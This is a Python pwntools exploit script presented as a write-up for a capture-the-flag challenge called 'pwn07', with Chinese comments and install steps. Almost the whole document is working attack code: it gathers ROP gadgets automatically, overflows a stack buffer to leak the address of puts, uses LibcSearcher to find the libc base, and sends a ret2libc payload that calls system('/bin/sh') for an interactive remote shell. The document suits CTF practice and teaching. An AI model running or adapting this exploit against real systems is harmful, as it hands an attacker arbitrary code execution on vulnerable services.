"""
Write-Up for pwn07

Ubuntu、Python3
1. 安装 pwntools:
   sudo apt-get install python3 python3-pip
   pip3 install pwntools

2. 安装 ROPgadget:
   pip3 install ROPgadget

3. 安装本地离线 LibcSearcher:
   a. 克隆仓库：git clone https://github.com/lieanu/LibcSearcher.git
   b. 进入目录：cd LibcSearcher
   c. 安装：python setup.py develop
"""

import re
import subprocess
import warnings

from LibcSearcher import *
from pwn import *

# 忽略可能出现的 BytesWarning 警告
warnings.filterwarnings("ignore", category=BytesWarning)

# Lambda 函数，用于读取以 '\x7f' 结尾的 6 字节地址，并转换为完整的 8 字节地址
r64_7f = lambda: u64(p.recvuntil(b"\x7f")[-6:] + b"\x00\x00")

# 手动配置区域
local = False  # 设置为 True 以启用本地调试模式
remote_addr = "192.168.10.2"  # 远程服务器地址
remote_port = 9999  # 远程服务器端口
local_binary = "pwn"  # 本地二进制文件名
offset = 0x30 + 0x8  # 缓冲区大小

# 手动执行 ROPgadget --binary ./本地二进制文件 --only "pop|ret"
# pop_rdi_addr = 0x400783  # 地址 pop rdi ; ret
# pop_ret_addr = 0x400506  # 地址 ret

# 自动执行 ROPgadget 命令 获取  pop_rdi_addr、pop_ret_addr 地址
output = subprocess.check_output(
    ["ROPgadget", "--binary", local_binary, "--only", "pop|ret"]
)
output = output.decode()

# 从输出中查找 pop rdi; ret 和 ret 地址
pop_rdi_match = re.search(r"0x[0-9a-fA-F]+ : pop rdi ; ret", output)
pop_ret_match = re.search(r"0x[0-9a-fA-F]+ : ret", output)

pop_rdi_addr = int(pop_rdi_match.group().split(" : ")[0], 16)
pop_ret_addr = int(pop_ret_match.group().split(" : ")[0], 16)

log.success(f"pop_rdi_addr: {hex(pop_rdi_addr)}")
log.success(f"pop_ret_addr: {hex(pop_ret_addr)}")

# 设置 pwntools 的上下文环境
context(arch="amd64", os="linux", log_level="debug")

# 根据配置选择目标
p = process(local_binary) if local else remote(remote_addr, remote_port)
e = ELF(local_binary)

# 构造 payload 以泄露 puts 函数地址
payload = (
    b"x" * offset
    + p64(pop_rdi_addr)
    + p64(e.got["puts"])
    + p64(e.plt["puts"])
    + p64(e.symbols["main"])
)
p.sendline(payload)
p.recvline()

# 获取实际的 puts 地址
puts_address = r64_7f()
log.success(f"Actual puts address: {hex(puts_address)}")

# 使用 LibcSearcher 确定 libc 版本并计算基址
libc = LibcSearcher("puts", puts_address)
log.success(f"{libc}")
libcbase = puts_address - libc.dump("puts")
log.success(f"libcbase address: {hex(libcbase)}")

# 计算 system 函数和 "/bin/sh" 字符串的地址
system_address = libcbase + libc.dump("system")
bin_sh_address = libcbase + libc.dump("str_bin_sh")
log.success(f"system address: {hex(system_address)}")
log.success(f"bin_sh address: {hex(bin_sh_address)}")

# 构造 payload 执行 system("/bin/sh") 获取 shell
payload = (
    b"x" * offset
    + p64(pop_ret_addr)
    + p64(pop_rdi_addr)
    + p64(bin_sh_address)
    + p64(system_address)
)
p.sendline(payload)
p.interactive()
